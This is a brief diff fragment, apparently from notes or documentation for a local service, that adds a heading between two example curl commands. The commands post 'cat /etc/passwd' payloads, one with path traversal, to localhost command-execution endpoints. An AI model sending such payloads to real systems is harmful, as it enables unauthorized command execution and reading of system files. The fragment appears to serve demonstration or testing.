@@ -4,7 +4,7 @@
 
     curl -X POST http://localhost:8080/execute -d 'cat ../../../../etc/passwd' -H 'Content-Type: text/plain' (v1)
 
-
+Contexts (OS and file server)
 
     curl -X POST http://localhost:8080/execute-system -d 'cat /etc/passwd' -H 'Content-Type: text/plain'  (v2)
 
